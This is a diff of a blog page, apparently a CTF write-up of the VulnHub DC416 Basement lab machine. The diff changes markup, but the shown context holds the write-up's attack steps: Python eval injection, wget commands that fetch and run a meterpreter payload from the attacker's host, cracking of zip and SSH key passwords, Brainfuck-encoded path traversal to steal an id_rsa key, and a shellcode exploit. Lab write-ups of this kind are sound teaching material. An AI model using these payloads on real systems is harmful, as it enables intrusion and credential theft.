@@ -135,7 +135,7 @@
 <h1 id="information-gathering">information gathering</h1>
 <p>Before you start with a portscan you need to wait a few minutes because there are several binaries executed by cronjobs. I noticed this during exploiting the machine so be sure to start nmapping after the machine runs a few minutes.</p>
 <p>Nmap Scan:</p>
-<pre><code>Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
+<pre tabindex="0"><code>Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-17 22:15 CET
 Nmap scan report for 192.168.56.101
 Host is up (0.00024s latency).
 Not shown: 65529 closed ports
@@ -171,13 +171,13 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 110.74 seconds
 </code></pre><h1 id="jack">jack</h1>
 <p>So let&rsquo;s start with the service on port 10000. The script asks the user to enter a number of packets to send and executes a ping:</p>
-<pre><code>root@kali:~/basement# nc 192.168.56.101 10000
+<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: 1
 
 PING localhost (127.0.0.1) 56(84) bytes of data
 64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.053 ms
 </code></pre><p>When entering something different we can see there is a python script which takes user input through the <code>input</code> method.</p>
-<pre><code>root@kali:~/basement# nc 192.168.56.101 10000
+<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: help
 Traceback (most recent call last):
   File &quot;./ping.py&quot;, line 3, in &lt;module&gt;
@@ -185,29 +185,29 @@ Traceback (most recent call last):
 TypeError: int() argument must be a string or a number, not '_Helper'
 </code></pre><p>In python 2 the <code>ìnput</code> method is the same as <code>eval(raw_input())</code> so it&rsquo;s possible to evaluate python statements (In python 3 <code>input</code> behaves the same as <code>raw_input</code>).</p>
 <p>So by trying the payload <code>__import__('os').system('id')</code> we can see the user running this script:</p>
-<pre><code>root@kali:~/basement# nc 192.168.56.101 10000
+<pre tabindex="0"><code>root@kali:~/basement# nc 192.168.56.101 10000
  Please enther number of packets: __import__('os').system('id')
 uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 
 PING localhost (127.0.0.1) 56(84) bytes of data
 </code></pre><p>So the next step is to download a meterpreter binary and execute it with the following set of commands:</p>
-<pre><code>echo &quot;__import__('os').system('wget -O /tmp/meterpreter http://192.168.56.3/meterpreter')&quot; | nc 192.168.56.101 10000
+<pre tabindex="0"><code>echo &quot;__import__('os').system('wget -O /tmp/meterpreter http://192.168.56.3/meterpreter')&quot; | nc 192.168.56.101 10000
 echo &quot;__import__('os').system('chmod +x /tmp/meterpreter')&quot; | nc 192.168.56.101 10000
 echo &quot;__import__('os').system('/tmp/meterpreter &amp;')&quot; | nc 192.168.56.101 10000
 </code></pre><p>Using the meterpreter session we are able to get the first flag:</p>
-<pre><code>meterpreter &gt; cat flag.txt
+<pre tabindex="0"><code>meterpreter &gt; cat flag.txt
 flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
 </code></pre><h1 id="marla-1">marla #1</h1>
 <p>By looking at <code>/etc/passwd</code> we can see there are 4 seperate users on the system so probably each user holds one flag.</p>
-<pre><code>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
+<pre tabindex="0"><code>jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
 marla:x:1001:1001:marla,,,:/home/marla:/bin/marla
 tyler:x:1002:1002:tyler,,,:/home/tyler:/bin/tyler
 robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
 </code></pre><p>In the folder <code>/home/jack/.secret/</code> there is a file called <code>marla.xip</code>. A file command on the file reveals only <code>data</code> so we have to dig deeper.</p>
-<pre><code>root@kali:~# file marla.xip
+<pre tabindex="0"><code>root@kali:~# file marla.xip
 marla.xip: data
 </code></pre><p>barrebas got me the hint that this <code>xip</code> extension is a mix of two filetypes. So the file is probably a XOR encrypted ZIP archive. To quickly test XOR keys I used <a href="https://github.com/hellman/xortool.git">xortool</a>.</p>
-<pre><code>root@kali:~/xortool# xortool -b /root/marla.xip
+<pre tabindex="0"><code>root@kali:~/xortool# xortool -b /root/marla.xip
 The most probable key lengths:
    3:   14.6%
    6:   19.6%
@@ -230,7 +230,7 @@ I0]L7I
 Found 0 plaintexts with 95.0%+ printable characters
 See files filename-key.csv, filename-char_used-perc_printable.csv
 </code></pre><p>Now let&rsquo;s look at the directory with the decoded files and see if we can spot something of interest:</p>
-<pre><code>root@kali:~/xortool/xortool_out# file * | grep -v &quot;     data&quot;
+<pre tabindex="0"><code>root@kali:~/xortool/xortool_out# file * | grep -v &quot;     data&quot;
 000.out:                               Zip archive data
 197.out:                               PGP\011Secret Key -
 199.out:                               PGP\011Secret Sub-key -
@@ -241,7 +241,7 @@ filename-char_used-perc_printable.csv: ASCII text
 filename-key.csv:                      ASCII text
 </code></pre><p>So we have found a ZIP archive. By looking at the generated csv we can see the XOR key beeing used was <code>M4YH3M</code>.</p>
 <p>Next step is to examine the contents of the zip file.</p>
-<pre><code>root@kali:~# mv 000.out /root/marla.zip
+<pre tabindex="0"><code>root@kali:~# mv 000.out /root/marla.zip
 root@kali:~# unzip -l marla.zip
 Archive:  marla.zip
   Length      Date    Time    Name
@@ -252,7 +252,7 @@ Archive:  marla.zip
      2162                     2 files
 </code></pre><p>Unfortunately the zip file is encrypted with a password so let&rsquo;s try to crack it.</p>
 <p>JohnTheRipper contains a handy little script called <code>zip2john</code> to extract the password hash for cracking. I then removed all except the hash from the file and ran hashcat against it.</p>
-<pre><code>[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
+<pre tabindex="0"><code>[firefart@linux hashcat]$ /home/firefart/hacking/JohnTheRipper/run/zip2john /home/firefart/marla.zip
 marla.zip:$zip2$*0*1*0*05ed2b46cc5c8fdd*4dfb*14c*3c099c875a5b4e660f310f657f34d7023b638556bc90a38168d5d752454a8954ebe2a08e064153f36afa0eb398f11139fae94e5cb7678dbda653de495847cd9e2c8c03573f6260f349a6e553b3a21647bcb351ae01ef15538cd613b97a144ad97d2f0db50bd29e093ea7772db8e465c5e6019f4427eab1f059241f86091148e8e292171a7cebb85fa07826f8b2061414931b217e63aa187ee508bad16cb1c57993bd703096b77e4e376edd9842e4363e58512b26422cbf1961a4ad741d4ab9d292a447cd6eaccd23e040702edb8be854798a35a63491b07b4c3b820e6c2a394e42a17180720cd9287f953f3482382068df0a98755ee27ba9ee0667b5b813cc3c9105a92d9f76566e9674d0c8ccc4050abeda5089d854546a5a39da8d93da503179dc6e0d847d29ede19654471d5a875e65a81e700810b4b7f1657bf8d78869e8078681dabfc35d0e0bc15fee*321fdfa476052bcf20c6*$/zip2$:::::marla.zip
 
 [firefart@linux hashcat]$ cat /home/firefart/marla.zip.hash
@@ -283,7 +283,7 @@ Started: Thu Jan 19 16:33:16 2017
 Stopped: Thu Jan 19 16:34:21 2017
 </code></pre><p>Awesome so the password is <code>m4rl4</code>.</p>
 <p>We are now able to extract the zip file with <code>p7zip</code>.</p>
-<pre><code>root@kali:~# p7zip -d marla.7z
+<pre tabindex="0"><code>root@kali:~# p7zip -d marla.7z
 
 7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-3520M CPU @ 2.90GHz (306A9),ASM,AES-NI)
@@ -312,7 +312,7 @@ Files: 2
 Size:       2162
 Compressed: 1974
 </code></pre><p>So let&rsquo;s have a look at the extracted files:</p>
-<pre><code>
+<pre tabindex="0"><code>
 root@kali:~# cat marla.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuh1NziT0vauHjqRvPIDQnFKYYtaYP1h56DXesZ6ZlSezFZVtJ1oQvLh3WJGgH7Bojzwxo4k5xwvw/0fyvCD68GGA99j8wfcYvFQ60BGMUYHfEduQPs0sAmL9tftIUY1vLf6htgCfz8oJ6Pi9YxLkgrS0+udGGxU0rXkU6hfaT710VH2DpvxymXbrKHHnd2wYmf/VVg54ugRyKWjKSBR+IkXTJr0FSMmsb7s1O84r1XTjJUJc6AZkiN1NLMxDQ1xnb/ToCnSpPIDm83fPDLDYhnlNZ2YoVqq9TTYVF9lxBaYLEjhVI+HKFF2geWjnMR5IHU/YwKWodcqh2GYY/LGNV marla@basement
 
@@ -350,7 +350,7 @@ W581cgXIWgN6actoiIGZXlHKB5Zsdb3GdmmG0Lb50lsL4GH8MIKDKdumUKSwrT20
 -----END RSA PRIVATE KEY-----
 </code></pre><p>Crap, another encrypted key. But we can see clearly this two files are SSH keys used for connecting as <code>marla</code> to the machine using SSH.</p>
 <p>Again, JohnTheRipper has a script ready for us: <code>sshng2john.py</code></p>
-<pre><code>[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key &gt; /home/firefart/marla
+<pre tabindex="0"><code>[firefart@linux run]$ /home/firefart/hacking/JohnTheRipper/run/sshng2john.py /home/firefart/marla.key &gt; /home/firefart/marla
 [firefart@linux run]$ ./john /home/firefart/marla.key
 Using default input encoding: UTF-8
 No password hashes loaded (see FAQ)
@@ -365,7 +365,7 @@ singer           (/home/firefart/marla.key)
 singer           (/home/firefart/marla.key)
 </code></pre><p>Jeah so the key password is <code>singer</code>.</p>
 <p>We can now use this password to retreive the next flag:</p>
-<pre><code>root@kali:~# ssh -i marla marla@192.168.56.101
+<pre tabindex="0"><code>root@kali:~# ssh -i marla marla@192.168.56.101
 The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
 ECDSA key fingerprint is SHA256:CGwzPRVhg2hHuFrgbZjV6MHx+xXtDLYXCzQJO3PrH4U.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -382,33 +382,33 @@ well done! your flag is flag{l4y3rs_up0n_l4y3rs}
 Connection to 192.168.56.101 closed.
 </code></pre><h1 id="marla-2">marla #2</h1>
 <p>By looking at the running processes there seems to be an audio stream of a flag streamed by <code>marla</code> and a binary only accepting connections from localhost run by <code>robert</code>.</p>
-<pre><code>marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
+<pre tabindex="0"><code>marla     3785  4.5  6.2 464280 31612 ?        S    02:10   0:06 ffserver -f /home/marla/ffserver.conf
 marla     3787 94.4  6.3 462656 32204 ?        R    02:10   2:10 ffmpeg -stream_loop -1 -f wav -i /home/marla/flag.wav http://127.0.0.1:8090/feed1.ffm
 robert    3782  0.0  0.5  19644  2808 ?        S    02:10   0:00 socat TCP-LISTEN:10001,reuseaddr,fork,range=127.0.0.1/32 EXEC:./tenbytes,pty,stderr,echo=0
 </code></pre><p>First we try the streaming webserver:</p>
-<pre><code>$ nc 127.0.0.1 8090
+<pre tabindex="0"><code>$ nc 127.0.0.1 8090
 GET / HTTP/1.0
 
 HTTP/1.0 301 Moved
 Location: http://localhost/flag.mpg
 Content-type: text/html
 </code></pre><p>So we need to get a file called <code>flag.mpg</code>. As this file is streamed endlessly we need to kill the download after a while as it will never end.</p>
-<pre><code>wget http://127.0.0.1:8090/flag.mpg
+<pre tabindex="0"><code>wget http://127.0.0.1:8090/flag.mpg
 </code></pre><p>By downloading the mpg and listening to it locally, we can hear a computer generated voice saying the following numbers:</p>
-<pre><code>102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
+<pre tabindex="0"><code>102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125
 </code></pre><p>By decoding the numbers as ascii, we get the second flag <code>flag{bR4in_paRas1te$}</code></p>
-<pre><code>a = &quot;102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125&quot;
+<pre tabindex="0"><code>a = &quot;102 108 97 103 123 98 82 52 105 110 95 112 97 82 97 115 49 116 101 36 125&quot;
 b = &quot;&quot;
 for x in a.split(&quot; &quot;):
 	b += chr(int(x))
 print(b)
 </code></pre><h1 id="tyler">tyler</h1>
 <p>When connecting to the webserver on port 8080 the following server header is returned</p>
-<pre><code>------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
+<pre tabindex="0"><code>------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.
 </code></pre><p>This string is definitely <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Using an <a href="https://copy.sh/brainfuck/">online decoder</a> we can see the string translates back to <code>webf</code>.</p>
 <p>When trying to access files in the webroot the webserver crashes and only comes up again after some time (probably by a cron job).</p>
 <p>All error messages are also translated to Brainfuck:</p>
-<pre><code>root@kali:~# nc 192.168.56.101 8080
+<pre tabindex="0"><code>root@kali:~# nc 192.168.56.101 8080
 webf
 HTTP/1.1 501 Not Implemented
 Content-type: text/html
@@ -418,11 +418,11 @@ Content-type: text/html
 &lt;p&gt;+[-------&gt;++&lt;]&gt;.+.+++++.[----&gt;+&lt;]&gt;+++.++[-&gt;+++&lt;]&gt;.+++++++++.++++++.-------.----------.: webf
 &lt;hr&gt;&lt;em&gt;------[--&gt;+++&lt;]&gt;.[-&gt;+++&lt;]&gt;.---.++++.&lt;/em&gt;
 </code></pre><p>By looking at the process list again the binary running seems to be <code>tiny</code>:</p>
-<pre><code>14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
+<pre tabindex="0"><code>14709  1      run_tiny.sh              0        tyler     /bin/bash /home/tyler/run_tiny.sh
 14711  14709  tiny                     0        tyler     /home/tyler/tiny 8080
 </code></pre><p>By asking our friend google this seems to be the <a href="https://github.com/shenfeng/tiny-web-server">tiny-web-server</a>. This webserver behaves as pythons <code>SimpleHTTPServer</code> and serves the whole directory from where it is run. By looking at the issues page there seems to be an unpatched arbitrary file read vulnerability <a href="https://github.com/shenfeng/tiny-web-server/issues/2">https://github.com/shenfeng/tiny-web-server/issues/2</a>.</p>
 <p>Our webserver crashes when requesting files normally so let&rsquo;s try to request <code>../../../../../../../etc/passwd</code> encoded in Brainfuck</p>
-<pre><code>root@kali:~# nc 192.168.56.101 8080
+<pre tabindex="0"><code>root@kali:~# nc 192.168.56.101 8080
 GET ++[------&gt;+&lt;]&gt;+++..+.-..+.-..+.-..+.-..+.-..+.-..+.[---&gt;+&lt;]&gt;.[---&gt;+&lt;]&gt;---.++[-&gt;+++&lt;]&gt;+.-[--&gt;+&lt;]&gt;--.+[-----&gt;+&lt;]&gt;.[-----&gt;++&lt;]&gt;+.--[---&gt;+&lt;]&gt;--..++++.[-&gt;+++&lt;]&gt;-. HTTP/1.0
 
 HTTP/1.1 200 OK
@@ -527,7 +527,7 @@ counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span
     counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
 </code></pre></div><p>By executing the script the server crashed at the <code>.ssh</code> entry so it must be an issue when requesting directories. But this also drove me in the right direction to try if there is an <code>.ssh/id_rsa</code> private key file present.</p>
 <p>After modifying the script we are able to download the private key file, ssh to the server as <code>tyler</code> and get the next flag <code>flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}</code>:</p>
-<pre><code>root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101
+<pre tabindex="0"><code>root@kali:~/basement# ssh -i basement_tyler.key tyler@192.168.56.101
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -544,7 +544,7 @@ Connection to 192.168.56.101 closed.
 <p>I thought there must be a call to <code>read</code> writing the 10 bytes to an executable area in memory and then a <code>jmp</code> or <code>call</code> instruction has to be executed to get to the custom shellcode. If we are able to execute the <code>read</code> call again using a bigger length we would be able to write shellcode to memory and execute it.</p>
 <p>By looking at the <a href="http://syscalls.kernelgrok.com/">sys_read</a> syscall we can see the length to read needs to go in the <code>EDX</code> register.</p>
 <p>So our assumption about the execution flow is the following</p>
-<pre><code>junk
+<pre tabindex="0"><code>junk
 mmap
 junk
 printf(&quot;Tee hee! Gimme ten bytes to run!&quot;)
@@ -694,7 +694,7 @@ offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>Last output from the run:</p>
-<pre><code>[+] Opening connection to 127.0.0.1 on port 10001: Done
+<pre tabindex="0"><code>[+] Opening connection to 127.0.0.1 on port 10001: Done
 [*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
 [*] Iterations: 8
 [*] EDX should now be 0x500
@@ -709,7 +709,7 @@ $ $
 <p><img src="/img/vulnhub_dc416_basement/binaryninja.png" alt="binaryninja"></p>
 <p>Thanks <a href="https://twitter.com/barrebas">@barrebas</a> for a lot hours trying to blindly bruteforce the binary :)</p>
 <p>The flags:</p>
-<pre><code>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
+<pre tabindex="0"><code>flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
 flag{bR4in_paRas1te$}
 flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
 flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}
@@ -722,7 +722,7 @@ flag{l4y3rs_up0n_l4y3rs}
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
             <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+            <li>source code available on <a href="https://github.com/FireFart/firefart.github.io">Github</a></li>
         </ul>
     </div>
 </div>
